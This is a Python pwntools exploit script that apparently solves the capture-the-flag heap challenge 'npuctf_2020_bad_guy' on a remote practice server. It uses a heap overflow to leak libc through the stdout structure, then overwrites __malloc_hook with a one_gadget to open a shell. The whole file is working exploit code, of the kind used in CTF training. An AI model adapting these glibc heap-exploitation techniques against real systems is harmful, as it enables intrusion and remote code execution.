from pwn import *

# context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('npuctf_2020_bad_guy')
io = remote('node4.buuoj.cn', 27094)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('npuctf_2020_bad_guy')
# one_gadgets_16 = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
one_gadgets_16 = [0x45216, 0x4526a, 0xf02a4, 0xf1147]


def add(index, size, content):
    io.sendlineafter('>> ', '1')
    io.sendlineafter('Index :', str(index))
    io.sendlineafter('size: ', str(size))
    io.sendafter('Content:', content)


def edit(index, size, content):
    io.sendlineafter('>> ', '2')
    io.sendlineafter('Index :', str(index))
    io.sendlineafter('size: ', str(size))
    io.sendafter('content: ', content)


def delete(index):
    io.sendlineafter('>> ', '3')
    io.sendlineafter('Index :', str(index))


def leak():
    global libc_base
    add(0, 0x18, 'chunk0')
    add(1, 0x18, 'chunk1')
    add(2, 0x68, 'chunk2')
    add(3, 0x18, 'chunk3')
    add(4, 0x68, 'chunk4')
    delete(2)
    payload = cyclic(0x18) + p8(0x91)
    edit(0, 0x19, payload)
    delete(1)
    add(1, 0x18, 'chunk1')
    payload = cyclic(0x18) + p64(0x71) + p16(0xc5dd)
    edit(1, 0x22, payload)
    add(2, 0x68, 'chunk2')
    payload = cyclic(0x33) + p64(0xfbad1800) + p64(0) * 3 + p8(0x88)
    add(5, 0x68, payload)
    libc_base = u64(io.recvuntil(b'\x7f\x00\x00')[-8:]) - libc.sym['_IO_2_1_stdin_']
    log.success('libc_base: ' + hex(libc_base)) 


def pwn():
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    realloc = libc_base + libc.sym['realloc']
    one_gadget = libc_base + one_gadgets_16[1]
    delete(4)
    payload = cyclic(0x18) + p64(0x71) + p64(__malloc_hook - 0x23)
    edit(3, 0x28, payload)
    add(4, 0x68, 'chunk4')
    payload = cyclic(0xb) + p64(one_gadget) + p64(realloc)
    add(5, 0x68, payload)
    # gdb.attach(io)
    io.sendlineafter('>> ', '1')
    io.sendlineafter('Index :', '6')
    io.sendlineafter('size: ', '1')
    io.interactive()
    # pause()


if __name__ == '__main__':
    while True:
        try:
            leak()
        except EOFError:
            io.close()
            # io = process('npuctf_2020_bad_guy')
            io = remote('node4.buuoj.cn', 27094)
        else:
            break
    pwn()
